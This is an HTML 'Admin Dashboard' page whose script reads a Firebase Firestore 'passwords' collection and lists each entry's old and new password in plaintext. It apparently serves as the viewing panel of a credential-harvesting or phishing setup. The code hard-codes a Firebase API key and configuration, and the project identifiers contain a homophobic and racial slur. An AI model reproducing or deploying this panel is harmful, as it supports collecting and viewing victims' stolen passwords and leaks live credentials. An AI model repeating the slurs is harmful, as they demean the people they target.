<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Admin Dashboard</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f4f4f4;
      margin: 0;
      padding: 0;
    }
    .container {
      max-width: 1200px;
      margin: 20px auto;
      padding: 20px;
      background: white;
      border-radius: 8px;
      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
    }
    h1 {
      text-align: center;
      color: #333;
      margin-bottom: 20px;
    }
    table {
      width: 100%;
      border-collapse: collapse;
      margin: 20px 0;
    }
    table th, table td {
      border: 1px solid #ddd;
      padding: 10px;
      text-align: center;
    }
    table th {
      background-color: #007BFF;
      color: white;
    }
    table tbody tr:nth-child(even) {
      background-color: #f9f9f9;
    }
    table tbody tr:hover {
      background-color: #f1f1f1;
    }
    @media (max-width: 768px) {
      table th, table td {
        font-size: 14px;
        padding: 8px;
      }
    }
    .footer {
      text-align: center;
      margin-top: 20px;
      color: #555;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Admin Dashboard</h1>
    <table>
      <thead>
        <tr>
          <th>ID</th>
          <th>Old Password</th>
          <th>New Password</th>
        </tr>
      </thead>
      <tbody id="tableBody">
        <!-- Data will be dynamically inserted here -->
      </tbody>
    </table>
    <div class="footer">Powered by Firebase</div>
  </div>

  <script type="module">
    import { initializeApp } from 'https://www.gstatic.com/firebasejs/9.17.1/firebase-app.js';
    import { getFirestore, collection, addDoc, getDocs, query, orderBy } from 'https://www.gstatic.com/firebasejs/9.17.1/firebase-firestore.js';

    // Firebase configuration
    const firebaseConfig = {
      apiKey: "AIzaSyBLqQhAtNuO632Xd3-e5Fe3oYDKLJGT8K0",
      authDomain: "gay-ass-nigga.firebaseapp.com",
      databaseURL: "https://gay-ass-nigga-default-rtdb.firebaseio.com",
      projectId: "gay-ass-nigga",
      storageBucket: "gay-ass-nigga.appspot.com",
      messagingSenderId: "740449529935",
      appId: "1:740449529935:web:ab2538ff3bdad3fbc8fa3a"
    };

    // Initialize Firebase
    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);

    // Reference to the table body
    const tableBody = document.getElementById('tableBody');

    // Fetch and display data
    async function fetchPasswords() {
      try {
        // Query passwords collection ordered by timestamp
        const passwordsRef = collection(db, 'passwords');
        const orderedQuery = query(passwordsRef, orderBy('timestamp', 'asc'));
        const querySnapshot = await getDocs(orderedQuery);

        let index = 1; // Sequential ID counter
        querySnapshot.forEach((doc) => {
          const data = doc.data();

          // Create table row
          const row = document.createElement('tr');

          // Sequential ID
          const idCell = document.createElement('td');
          idCell.textContent = index++;
          row.appendChild(idCell);

          // Old Password
          const oldPasswordCell = document.createElement('td');
          oldPasswordCell.textContent = data.oldPassword;
          row.appendChild(oldPasswordCell);

          // New Password
          const newPasswordCell = document.createElement('td');
          newPasswordCell.textContent = data.newPassword;
          row.appendChild(newPasswordCell);

          // Append row to table
          tableBody.appendChild(row);
        });
      } catch (error) {
        console.error("Error fetching passwords:", error);
      }
    }

    // Add password to Firestore (with timestamp)
    async function addPassword(oldPassword, newPassword) {
      try {
        await addDoc(collection(db, 'passwords'), {
          oldPassword,
          newPassword,
          timestamp: new Date()
        });
        console.log("Password added successfully!");
      } catch (error) {
        console.error("Error adding password:", error);
      }
    }

    // Fetch passwords on page load
    fetchPasswords();
  </script>
</body>
</html>
